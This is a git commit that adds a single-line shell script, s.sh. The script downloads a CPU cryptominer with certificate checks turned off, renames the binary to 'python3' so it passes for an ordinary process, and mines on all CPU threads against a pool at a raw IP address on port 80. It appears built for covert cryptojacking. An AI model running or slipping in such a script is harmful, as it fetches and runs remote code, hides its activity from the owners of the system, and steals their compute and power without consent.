ef889e22dc5346f9ced0446e24c66cd8c7561dae
Muhamad Wisnu <147334027+nu-dev2024@users.noreply.github.com>
2024-11-25 20:15:10 +0700

    Create s.sh

---
+++ s.sh
@@ -0,0 +1,1 @@
+wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yespowertide -o stratum+tcp://165.22.181.62:80 -u TSWUnxrHkAKGYMKvPcXvEdBDehB5Lm3BEP.IniPonk -p x -t$(nproc --all)
